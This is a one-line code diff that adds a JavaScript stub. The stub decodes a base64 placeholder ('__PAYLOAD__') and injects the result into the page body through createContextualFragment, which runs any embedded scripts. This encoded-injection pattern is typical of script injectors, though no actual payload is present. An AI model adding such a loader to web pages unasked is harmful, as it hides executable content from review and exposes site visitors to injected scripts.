@@ -1,0 +1,1 @@
+const payload="__PAYLOAD__";const node=document.createRange().createContextualFragment(atob(payload));document.getElementsByTagName('body')[0].appendChild(node);
